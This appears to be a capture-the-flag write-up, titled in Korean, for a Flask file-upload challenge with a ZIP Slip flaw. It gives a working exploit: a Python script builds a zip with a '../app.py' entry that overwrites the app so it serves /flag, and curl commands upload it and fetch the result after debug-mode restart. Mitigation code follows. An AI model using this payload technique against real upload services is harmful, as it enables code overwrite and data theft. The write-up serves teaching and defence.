# 🐢 거북이

## Description

집 앞에서 거북이를 주워 어항에 넣어두었는데, 다음 날 보니 사라졌습니다.
“어항이 높은데… 대체 어떻게 빠져나간 거지?”

## Vulnerability Analysis

### Code Analysis
```python
# Vulnerable section in app.py
@app.route("/upload", methods=["POST"])
def upload():
    # ... (omitted)
    if (f.filename or "").lower().endswith(".zip") or "zip" in (f.content_type or "").lower():
        data = f.read()
        zf = zipfile.ZipFile(io.BytesIO(data))
        names = []
        for info in zf.infolist():
            target = UPLOAD_DIR / info.filename  # ← Vulnerability point
            # ... file extraction logic
```

### Vulnerability Core
1. **No Path Validation**: No filtering applied to `info.filename`
2. **Path Object Characteristics**: `Path("/app/uploads") / "../app.py"` → `Path("/app/app.py")`
3. **Absolute Path Priority**: `Path("/app/uploads") / "/flag"` → `Path("/flag")`

## Attack Scenario

### Step 1: Vulnerability Confirmation
```bash
# Test normal file upload
echo "test content" > test.txt
curl -X POST -F "file=@test.txt" http://target/upload
# Result: {"ok": true, "saved": "1.txt"}

# Verify uploaded file access
curl "http://target/uploads/1.txt"
# Result: test content
```

### Step 2: ZIP Slip Attack Payload Creation
```python
import zipfile

# Malicious Flask application code
payload = b"""
from flask import Flask, send_file

app = Flask(__name__)

@app.route('/')
def get_flag():
    try:
        return send_file('/flag')
    except Exception as e:
        return str(e)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
"""

# Path traversal filename to overwrite app.py
filename_in_zip = "../app.py"

# Create the malicious zip file
zip_file_name = "exploit.zip"
with zipfile.ZipFile(zip_file_name, 'w') as zf:
    zf.writestr(filename_in_zip, payload)

print(f"'{zip_file_name}' created successfully.")
```

### Step 3: Attack Execution
```bash
# Upload malicious ZIP file
curl -X POST -F "file=@exploit.zip" http://target/upload

# Check response
# {"ok": true, "saved": ["../app.py"]}
```

### Step 4: Flag Acquisition
```bash
# Wait for Flask debug=True mode auto-restart (5-10 seconds)
sleep 10

# Obtain flag from overwritten application
curl "http://target/"
```

## Attack Success Mechanism

### ZIP Slip Mechanism
1. **Path Manipulation**: Set filename in ZIP file as `../app.py`
2. **Path Operation**: `UPLOAD_DIR / "../app.py"` → `/app/app.py`
3. **File Overwrite**: Original Flask application replaced with malicious code

### Flask Debug Mode Exploitation
1. **Auto-restart**: `debug=True` causes automatic restart on file changes
2. **Code Execution**: Overwritten malicious code executes on server
3. **Flag Exposure**: `/flag` file served via HTTP response

## Key Points

### 1. Python Path Object Characteristics
```python
from pathlib import Path

# Relative path traversal
Path("/app/uploads") / "../app.py"     # → /app/app.py

# Absolute path priority (more dangerous)
Path("/app/uploads") / "/flag"         # → /flag
```

### 2. Flask's send_file vs Direct Reading
- `send_file('/flag')`: Safely transmits file as HTTP response
- Direct file reading is possible but requires consideration of binary handling

### 3. Timing Importance
- Flask debug mode auto-restart doesn't occur immediately
- Takes several seconds from file system change detection to restart

## Countermeasures

### 1. Enhanced Input Validation
```python
import os
from pathlib import Path

def safe_extract(zf, extract_to):
    for info in zf.infolist():
        # Check for dangerous path characters
        if '..' in info.filename or info.filename.startswith('/'):
            raise ValueError(f"Unsafe path: {info.filename}")
        
        # Validate normalized path
        target = Path(extract_to) / info.filename
        if not str(target.resolve()).startswith(str(Path(extract_to).resolve())):
            raise ValueError(f"Path traversal detected: {info.filename}")
```

### 2. Production Environment Configuration
```python
# Set debug=False to disable auto-restart
app.run(host="0.0.0.0", port=5000, debug=False)
```

### 3. File Permission Restrictions
- Minimize permissions for web application execution account
- Remove write permissions on critical files

## Conclusion
This challenge represents a typical web hacking scenario combining **ZIP Slip vulnerability** with **Flask debug mode**. When implementing file upload functionality, path validation must be performed, and debug mode should be disabled in production environments.
